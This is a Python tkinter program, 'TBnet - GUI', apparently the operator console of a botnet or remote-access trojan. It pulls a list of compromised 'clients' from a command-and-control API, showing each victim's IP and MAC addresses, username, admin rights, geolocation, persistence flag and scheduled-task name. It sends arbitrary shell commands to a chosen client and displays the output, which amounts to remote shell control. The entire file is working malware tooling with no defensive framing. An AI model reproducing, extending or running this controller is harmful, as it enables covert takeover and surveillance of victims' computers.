from tkinter import *
import tkinter.messagebox as message
import requests
import json


class Application(Tk):

    list_bouton_clients = {}
    num_client_focus = None
    SEPARATOR = "<sep>"
    save_text = {}
    preference_is_open = False

    ip = "127.0.0.1"
    port = 4447

    def __init__(self):
        Tk.__init__(self)
        self.root = self
        self.root.minsize(400, 300)
        self.creer_widgets()

    def creer_widgets(self):
        # the text and entry frames column
        self.root.grid_columnconfigure(1, weight=1)
        self.root.grid_rowconfigure(0, weight=1)  # all frames row
        # Chargement conf logiciel
        self.value_ip = StringVar()
        self.value_ip.set(self.ip)
        self.value_port = StringVar()
        self.value_port.set(str(self.port))
        # Conf bar menu
        menubar = Menu(self.root)
        menu1 = Menu(menubar, tearoff=0)
        menu1.add_command(label="Préférences", command=self.MenuPreference)
        menu1.add_separator()
        menu1.add_command(label="Recharger", command=self.Reload)
        menubar.add_cascade(label="Options", menu=menu1)
        self.root.config(menu=menubar)
        # conf frame 1
        self.frame1 = Frame(self.root, bg="grey", relief=GROOVE, borderwidth=2)
        self.frame1.grid(column=0, row=0, sticky='news')
        # conf frame 2
        self.frame2 = Frame(self.root, bg="black",
                            relief=GROOVE, borderwidth=2)
        self.frame2.grid_rowconfigure(0,  weight=0)
        self.frame2.grid_rowconfigure(1,  weight=1)
        self.frame2.grid_columnconfigure(0,  weight=1)
        self.frame2.grid(column=1, row=0, sticky='news')
        self.aff_name_client = Label(self.frame2, text="No Client", font=(
            "Arial", 12), fg="white", bg="black")
        self.aff_name_client.grid(column=0, row=0)
        self.text = Text(self.frame2, bg="black", fg="white")
        # self.text.config(state=DISABLED)
        self.text.grid(column=0, row=1, sticky='news')
        # conf frame 3
        self.frame3 = Frame(self.frame2, bg="grey",
                            relief=GROOVE, borderwidth=2)
        self.frame3.grid(column=0, row=2, sticky='news')
        self.frame3.grid_columnconfigure(0,  weight=1)
        self.frame3.grid_columnconfigure(1,  weight=1)
        self.frame3.grid_columnconfigure(1,  weight=1)
        self.entree_value = StringVar()
        self.entree_value.set("")
        boutonShowInfo = Button(
            self.frame3, text="Show Info", command=self.ShowInfo)
        boutonShowInfo.grid(column=0, row=0, sticky='w')
        entree = Entry(self.frame3, textvariable=self.entree_value, width=30)
        entree.bind("<Return>", self.EnvoyerCommande)
        entree.grid(column=1, row=0, sticky='w')
        boutonEnvoyer = Button(self.frame3, text="Envoyer",
                               command=self.EnvoyerCommande)
        boutonEnvoyer.grid(column=2, row=0, sticky='e')
        self.LoadClients()

    def LoadClients(self):
        res_api = self.RequestApi("getclients")
        if res_api == "Erreur":
            return False
        clients_info = json.loads(res_api)
        self.list_bouton_clients = {}
        nb_clients = clients_info["nombre_clients"]
        for i in range(0, nb_clients):
            client_info = {
                "client_name": "client{}".format(str(i+1)),
                "client_num": clients_info["final"]["client{}".format(str(i+1))]["client_num"],
                "platform": clients_info["final"]["client{}".format(str(i+1))]["platform"],
                "public_ip": clients_info["final"]["client{}".format(str(i+1))]["public_ip"],
                "local_ip": clients_info["final"]["client{}".format(str(i+1))]["local_ip"],
                "mac_address": clients_info["final"]["client{}".format(str(i+1))]["mac_address"],
                "architecture": clients_info["final"]["client{}".format(str(i+1))]["architecture"],
                "device": clients_info["final"]["client{}".format(str(i+1))]["device"],
                "username": clients_info["final"]["client{}".format(str(i+1))]["username"],
                "administrator": clients_info["final"]["client{}".format(str(i+1))]["administrator"],
                "geolocation": clients_info["final"]["client{}".format(str(i+1))]["geolocation"],
                "ipv4": clients_info["final"]["client{}".format(str(i+1))]["ipv4"],
                "persistance": clients_info["final"]["client{}".format(str(i+1))]["persistance"],
                "name_task": clients_info["final"]["client{}".format(str(i+1))]["name_task"]
            }
            btn_client = Button(self.frame1, text="client{}".format(
                str(i+1)), command=lambda arg=client_info: self.SetViewOnClient(arg), )
            btn_client.grid(column=0, row=i, padx=3, pady=5)
            self.list_bouton_clients.update(
                {client_info["client_num"]: btn_client})
        return True

    def SetViewOnClient(self, client_info):
        # print(client_info)
        self.aff_name_client["text"] = client_info["client_name"]
        self.num_client_focus = client_info["client_num"]
        self.focus_client_name = client_info["client_name"]
        self.focus_client_num = client_info["client_num"]
        self.focus_platform = client_info["platform"]
        self.focus_public_ip = client_info["public_ip"]
        self.focus_local_ip = client_info["local_ip"]
        self.focus_mac_address = client_info["mac_address"]
        self.focus_architecture = client_info["architecture"]
        self.focus_device = client_info["device"]
        self.focus_username = client_info["username"]
        self.focus_administrator = client_info["administrator"]
        self.focus_geolocation = client_info["geolocation"]
        self.focus_ipv4 = client_info["ipv4"]
        self.focus_persistance = client_info["persistance"]
        self.focus_name_task = client_info["name_task"]
        self.text.delete('1.0', END)
        try:
            self.text.insert(END, self.save_text[self.num_client_focus])
        except:
            pass

    def EnvoyerCommande(self, event=""):
        cmd = self.entree_value.get()
        if self.num_client_focus == None:
            #print("Pas de Client focus")
            pass
        elif cmd == "":
            #print("Aucune Commande donné")
            pass
        else:
            id = self.num_client_focus
            result_cmd = self.RequestApi(
                "cmd?id_cible={}&cmd={}".format(id, cmd))
            if "<title>500 Internal Server Error</title>" in result_cmd:
                self.text.insert(
                    INSERT, "Erreur Le client n'est pas connecter au serveur\n")
            else:
                result, pwd = result_cmd.split(self.SEPARATOR)
                self.text.insert(END, "\n{} $> {}\n".format(pwd, cmd))
                self.text.insert(END, result)
                self.save_text.update({id: self.text.get('1.0', END)})
            self.entree_value.set("")

    def ShowInfo(self):
        if self.num_client_focus == None:
            #print("Pas de Client focus")
            pass
        else:
            fenetre_info = Toplevel()
            fenetre_info.title(
                "TBnet - Info - {}".format(self.focus_client_name))
            fenetre_info.minsize(300, 400)
            fenetre_info.grid_columnconfigure(0,  weight=1)

            lab_info = Label(fenetre_info, text="Information : {}".format(
                self.focus_client_name), font=("Arial", 15))
            lab_info.grid(column=0, row=0, pady=20)

            frame_info = Frame(fenetre_info, borderwidth=2, relief=SUNKEN)
            frame_info.grid(column=0, row=1)

            lab_client_num = Label(
                frame_info, text="client_num : {}".format(self.focus_client_num))
            lab_client_num.grid(column=0, row=0)
            lab_platform = Label(
                frame_info, text="platform : {}".format(self.focus_platform))
            lab_platform.grid(column=0, row=1)
            lab_public_ip = Label(
                frame_info, text="public_ip : {}".format(self.focus_public_ip))
            lab_public_ip.grid(column=0, row=2)
            lab_local_ip = Label(
                frame_info, text="local_ip : {}".format(self.focus_local_ip))
            lab_local_ip.grid(column=0, row=3)
            lab_mac_address = Label(
                frame_info, text="mac_address : {}".format(self.focus_mac_address))
            lab_mac_address.grid(column=0, row=4)
            lab_architecture = Label(
                frame_info, text="architecture : {}".format(self.focus_architecture))
            lab_architecture.grid(column=0, row=5)
            lab_device = Label(
                frame_info, text="device : {}".format(self.focus_device))
            lab_device.grid(column=0, row=6)
            lab_username = Label(
                frame_info, text="username : {}".format(self.focus_username))
            lab_username.grid(column=0, row=7)
            lab_administrator = Label(
                frame_info, text="administrator : {}".format(self.focus_administrator))
            lab_administrator.grid(column=0, row=8)
            lab_geolocation = Label(
                frame_info, text="geolocation : {}".format(self.focus_geolocation))
            lab_geolocation.grid(column=0, row=9)
            lab_ipv4 = Label(
                frame_info, text="ipv4 : {}".format(self.focus_ipv4))
            lab_ipv4.grid(column=0, row=10)
            lab_persistance = Label(
                frame_info, text="persistance : {}".format(self.focus_persistance))
            lab_persistance.grid(column=0, row=11)
            lab_name_task = Label(
                frame_info, text="name_task : {}".format(self.focus_name_task))
            lab_name_task.grid(column=0, row=12)

            btn_fermer = Button(fenetre_info, text="Fermer",
                                command=fenetre_info.destroy)
            btn_fermer.grid(column=0, row=2, pady=20)

            fenetre_info.mainloop()

    def Reload(self):
        for i in self.list_bouton_clients:
            btn = self.list_bouton_clients[i]
            btn.destroy()
        self.num_client_focus = None
        self.aff_name_client["text"] = "No Client"
        self.entree_value.set("")
        self.text.delete('1.0', END)
        self.LoadClients()

    def MenuPreference(self):
        if not self.preference_is_open:
            self.fenetre_preference = Toplevel(bg="black")
            self.preference_is_open = True
            self.fenetre_preference.protocol(
                "WM_DELETE_WINDOW", self.on_closing_pref)
            self.fenetre_preference.title(
                "Préférence")
            self.fenetre_preference.minsize(400, 150)
            self.fenetre_preference.grid_columnconfigure(0,  weight=1)
            self.fenetre_preference.grid_rowconfigure(0,  weight=1)
            self.fenetre_preference.grid_rowconfigure(1,  weight=1)
            self.fenetre_preference.grid_rowconfigure(2,  weight=1)
            lab_preference = Label(self.fenetre_preference, text="Préférences :", font=(
                "Arial", 15), bg="black", fg="white")
            lab_preference.grid(column=0, row=0, pady=20)
            frame_preference = Frame(
                self.fenetre_preference, bg="black", borderwidth=2, relief=SUNKEN)
            frame_preference.grid(column=0, row=1)
            lab_ip = Label(
                frame_preference, text="Adresse Ip du serveur TBnet : ", bg="black", fg="white")
            lab_ip.grid(column=0, row=0, pady=2, padx=2)
            entree_ip = Entry(
                frame_preference, textvariable=self.value_ip, width=30, bg="black", fg="white")
            self.value_ip.set(self.ip)
            #entree_ip.bind("<Return>", self.EnvoyerCommande)
            entree_ip.grid(column=1, row=0, pady=2, padx=2)
            lab_port = Label(
                frame_preference, text="Port de l'Api du serveur TBnet : ", bg="black", fg="white")
            lab_port.grid(column=0, row=1, pady=2, padx=2)
            entree_port = Entry(
                frame_preference, textvariable=self.value_port, width=30, bg="black", fg="white")
            self.value_port.set(str(self.port))
            #entree_ip.bind("<Return>", self.EnvoyerCommande)
            entree_port.grid(column=1, row=1, pady=2, padx=2)
            btn_valider = Button(self.fenetre_preference, command=lambda: self.ValiderPreference(
                entree_ip.get(), entree_port.get()), text="Valider", bg="black", fg="white")
            btn_valider.grid(column=0, row=2, pady=10)

    def ValiderPreference(self, ip, port):
        if not ip.isdigit() and port.isdigit():
            self.ip = ip
            self.port = int(port)
            self.preference_is_open = False
            self.fenetre_preference.destroy()
        else:
            message.showerror('Erreur', 'Un des éléments donné est incorect.')

    def on_closing_pref(self):
        self.preference_is_open = False
        self.fenetre_preference.destroy()

    def RequestApi(self, arg=""):
        url = "http://{}:{}/{}".format(self.ip, str(self.port), arg)
        try:
            response = requests.get(url)
        except Exception as e:
            message.showerror(
                'Erreur', 'Le Programe n\'arrive pas a joindre l\'Api.\n\Vérifier l\'adresse ip, le port et si l\'api est bien en fonctionement.\n\nInfo Erreur : {}'.format(e))
            return "Erreur"
        return response.text


if __name__ == "__main__":
    app = Application()
    app.title("TBnet - GUI")
    app.mainloop()
